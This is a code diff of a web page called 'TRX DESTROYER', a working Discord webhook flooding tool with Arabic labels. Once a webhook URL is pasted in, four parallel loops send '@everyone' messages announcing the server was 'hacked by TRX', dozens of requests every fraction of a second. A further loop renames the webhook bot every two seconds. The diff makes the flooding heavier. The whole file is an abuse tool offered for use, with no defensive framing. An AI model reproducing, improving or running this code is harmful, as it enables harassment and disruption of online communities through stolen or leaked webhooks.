@@ -2,168 +2,199 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>MRX · TRX DESTROYER</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRX ☣️ · DESTROYER</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: Arial; background: #0a0a0a; color: #fff;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #0a0a0a; color: #fff;
             display: flex; justify-content: center; align-items: center;
             min-height: 100vh; margin: 0;
         }
         .box {
-            background: #111; border: 1px solid #333;
+            background: #111;
+            border: 1px solid #2a2a2a;
             border-radius: 30px; padding: 40px;
-            width: 500px; max-width: 95%; text-align: center;
+            width: 520px; max-width: 95%; text-align: center;
         }
-        h1 { color: #ff1a1a; letter-spacing: 5px; margin: 0 0 5px; font-size: 38px; }
-        p { color: #555; font-size: 12px; margin: 0 0 20px; letter-spacing: 3px; }
-        input {
+        h1 { color: #ff1a1a; letter-spacing: 5px; margin: 0 0 5px; font-size: 42px; }
+        .sub { color: #555; font-size: 12px; margin: 0 0 20px; letter-spacing: 3px; }
+        input, textarea {
             width: 100%; padding: 15px 20px; box-sizing: border-box;
             background: #1a1a1a; border: 1px solid #333;
             border-radius: 30px; color: #fff; font-size: 14px;
             direction: ltr; text-align: left; outline: none;
+            font-family: inherit;
         }
         input:focus { border-color: #ff1a1a; }
-        .brow {
-            display: flex; gap: 10px; margin: 20px 0;
-        }
+        .row { display: flex; gap: 10px; margin: 20px 0; }
         .b1 {
             flex: 1; padding: 16px; background: #cc0000; color: #fff;
             border: none; border-radius: 30px; font-size: 16px;
             font-weight: 700; cursor: pointer; letter-spacing: 3px;
+            transition: 0.2s;
         }
-        .b1:hover { background: #ff1a1a; }
+        .b1:hover:not(:disabled) { background: #ff1a1a; transform: scale(1.02); }
         .b1:disabled { opacity: 0.3; cursor: not-allowed; }
         .b2 {
             flex: 1; padding: 16px; background: #222; color: #888;
             border: 1px solid #444; border-radius: 30px; font-size: 16px;
             font-weight: 700; cursor: pointer; letter-spacing: 3px;
+            transition: 0.2s;
         }
-        .b2:hover { background: #cc0000; color: #fff; }
+        .b2:hover:not(:disabled) { background: #cc0000; color: #fff; border-color: #cc0000; }
         .b2:disabled { opacity: 0.3; cursor: not-allowed; }
-        #cnt { color: #00ff88; font-size: 22px; font-weight: 700; margin: 5px 0; }
+        .stat { color: #888; font-size: 14px; margin: 5px 0; }
+        #cnt { color: #00ff88; font-size: 28px; font-weight: 700; }
         #log {
-            width: 100%; height: 160px; margin-top: 12px; box-sizing: border-box;
+            width: 100%; height: 180px; margin-top: 12px;
             background: #050505; color: #00ff88;
             border: 1px solid #2a2a2a; border-radius: 16px;
-            padding: 15px; font-family: monospace; font-size: 12px;
-            direction: ltr; text-align: left; resize: none;
+            padding: 15px; font-family: 'Courier New', monospace; font-size: 12px;
+            direction: ltr; text-align: left; resize: none; overflow-y: auto;
         }
+        .badge { color: #ff1a1a; font-size: 11px; margin-top: 10px; letter-spacing: 2px; opacity: 0.6; }
     </style>
 </head>
 <body>
 <div class="box">
     <h1>☠️ TRX</h1>
-    <p>● @everyone + تغيير اسم البوت ●</p>
+    <p class="sub">● @everyone + تغيير اسم البوت ●</p>
     <input type="text" id="wh" placeholder="https://discord.com/api/webhooks/...">
-    <div class="brow">
+    <div class="row">
         <button class="b1" id="go" onclick="START()">💀 ابدأ</button>
         <button class="b2" id="stp" onclick="STOP()" disabled>⛔ إيقاف</button>
     </div>
-    <div>الرسائل: <span id="cnt">0</span></div>
+    <div class="stat">الرسائل المرسلة:</div>
+    <div id="cnt">0</div>
     <textarea id="log" readonly placeholder="..."></textarea>
+    <div class="badge">● TRX ☣️ HUB ●</div>
 </div>
 
 <script>
-let run = false, stopIt = false, n = 0, timers = [];
+let running = false, stopped = false, sent = 0, allTimers = [];
 
-function $(x) { return document.getElementById(x); }
+function $(id) { return document.getElementById(id); }
 
-function LOG(t) {
-    const e = $('log');
-    e.value += `[${new Date().toLocaleTimeString()}] ${t}\n`;
-    e.scrollTop = e.scrollHeight;
+function log(msg) {
+    const el = $('log');
+    const time = new Date().toLocaleTimeString('ar-SA');
+    el.value += `[${time}] ${msg}\n`;
+    el.scrollTop = el.scrollHeight;
 }
 
-async function SEND(wh, txt) {
-    if (stopIt) return;
-    try {
-        const fd = new FormData();
-        fd.append('payload_json', JSON.stringify({ content: txt }));
-        await fetch(wh, { method: 'POST', mode: 'no-cors', body: fd });
-        n++;
-        $('cnt').textContent = n;
-    } catch(e) {}
-}
-
-async function RENAME(wh) {
-    if (stopIt) return;
+async function sendMsg(wh, text) {
+    if (stopped) return;
     try {
         await fetch(wh, {
-            method: 'PATCH', mode: 'no-cors',
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ content: text })
+        });
+        sent++;
+        $('cnt').textContent = sent;
+    } catch (e) {
+        // silent
+    }
+}
+
+async function renameBot(wh) {
+    if (stopped) return;
+    try {
+        const r = await fetch(wh, {
+            method: 'PATCH',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ name: 'TRX ☣️' })
         });
-        LOG('✅ تم تغيير اسم البوت → TRX ☣️');
-    } catch(e) {}
+        if (r.ok) log('✅ تم تغيير اسم البوت → TRX ☣️');
+    } catch (e) {}
 }
 
-// حلقة الإرسال — 10 رسائل كل دورة
-function SPAM_LOOP(wh, txt) {
-    if (stopIt) return;
-    for (let i = 0; i < 10; i++) SEND(wh, txt);
-    const t = setTimeout(() => SPAM_LOOP(wh, txt), 200);
-    timers.push(t);
+// ====== HEAVY SPAM LOOPS ======
+
+function loop1(wh, txt) {
+    if (stopped) return;
+    // 20 رسالة سريعة
+    for (let i = 0; i < 20; i++) sendMsg(wh, txt);
+    const t = setTimeout(() => loop1(wh, txt), 100);  // كل 100ms
+    allTimers.push(t);
 }
 
-// حلقة تغيير الاسم — كل 3 ثواني
-function NAME_LOOP(wh) {
-    if (stopIt) return;
-    RENAME(wh);
-    const t = setTimeout(() => NAME_LOOP(wh), 3000);
-    timers.push(t);
+function loop2(wh, txt) {
+    if (stopped) return;
+    for (let i = 0; i < 15; i++) sendMsg(wh, txt);
+    const t = setTimeout(() => loop2(wh, txt), 150);
+    allTimers.push(t);
 }
 
-// حلقة ثانية إرسال — زيادة قوة
-function SPAM_LOOP2(wh, txt) {
-    if (stopIt) return;
-    for (let i = 0; i < 10; i++) SEND(wh, txt);
-    const t = setTimeout(() => SPAM_LOOP2(wh, txt), 400);
-    timers.push(t);
+function loop3(wh, txt) {
+    if (stopped) return;
+    for (let i = 0; i < 15; i++) sendMsg(wh, txt);
+    const t = setTimeout(() => loop3(wh, txt), 200);
+    allTimers.push(t);
 }
+
+function loop4(wh, txt) {
+    if (stopped) return;
+    for (let i = 0; i < 10; i++) sendMsg(wh, txt);
+    const t = setTimeout(() => loop4(wh, txt), 80);  // أسرع واحد
+    allTimers.push(t);
+}
+
+function nameLoop(wh) {
+    if (stopped) return;
+    renameBot(wh);
+    const t = setTimeout(() => nameLoop(wh), 2000);  // كل 2 ثانية
+    allTimers.push(t);
+}
+
+// ====== MAIN ======
 
 function START() {
     const wh = $('wh').value.trim();
-    if (!wh) { alert('حط رابط Webhook'); return; }
-    if (run) return;
-    run = true; stopIt = false; n = 0;
-    timers = [];
+    if (!wh) { alert('⚠️ حط رابط Webhook أول!'); return; }
+    if (running) return;
+
+    running = true; stopped = false; sent = 0;
+    allTimers = [];
     $('cnt').textContent = '0';
     $('go').disabled = true;
     $('stp').disabled = false;
-    LOG('🚀 بدء التدمير — @everyone + TRX ☣️');
-    LOG('🚀 ما يوقف إلا إذا ضغطت إيقاف');
+    $('log').value = '';
 
-    const txt = '@everyone تم التهكير من قبل TRX | HUB - النظام التراكسي - ☣️ @everyone';
+    log('🚀 بدء الهجوم — TRX ☣️ DESTROYER');
+    log('🚀 4 حلقات إرسال ثقيلة + تغيير الاسم المستمر');
+    log('⚠️  ما يوقف إلا إذا ضغطت إيقاف');
 
-    // 3 حلقات إرسال + 1 حلقة تغيير اسم
-    SPAM_LOOP(wh, txt);
-    SPAM_LOOP2(wh, txt);
-    NAME_LOOP(wh);
+    const msg = '@everyone تم التهكير من قبل TRX | HUB - النظام التراكسي - ☣️ @everyone';
 
-    // حلقة ثالثة خفيفة
-    const t3 = setTimeout(() => {
-        function L3() {
-            if (stopIt) return;
-            for (let i = 0; i < 10; i++) SEND(wh, txt);
-            const t = setTimeout(L3, 600);
-            timers.push(t);
-        }
-        L3();
-    }, 100);
-    timers.push(t3);
+    // تشغيل كل الحلقات
+    loop1(wh, msg);
+    loop2(wh, msg);
+    loop3(wh, msg);
+    loop4(wh, msg);
+    nameLoop(wh);
+
+    // تقرير كل 5 ثواني
+    const report = setInterval(() => {
+        if (stopped) { clearInterval(report); return; }
+        log(`📊 إجمالي الرسائل: ${sent}`);
+    }, 5000);
+    allTimers.push(report);
 }
 
 function STOP() {
-    if (!run) return;
-    LOG('⛔ إيقاف...');
-    stopIt = true;
-    for (const t of timers) clearTimeout(t);
-    timers = [];
+    if (!running) return;
+    log('⛔ جاري الإيقاف...');
+    stopped = true;
+    for (const t of allTimers) clearTimeout(t);
+    allTimers = [];
     setTimeout(() => {
-        run = false;
+        running = false;
         $('go').disabled = false;
         $('stp').disabled = true;
-        LOG(`🛑 توقف. تم الإرسال: ${n}`);
+        log(`🛑 توقف. المجموع: ${sent} رسالة`);
     }, 300);
 }
 </script>
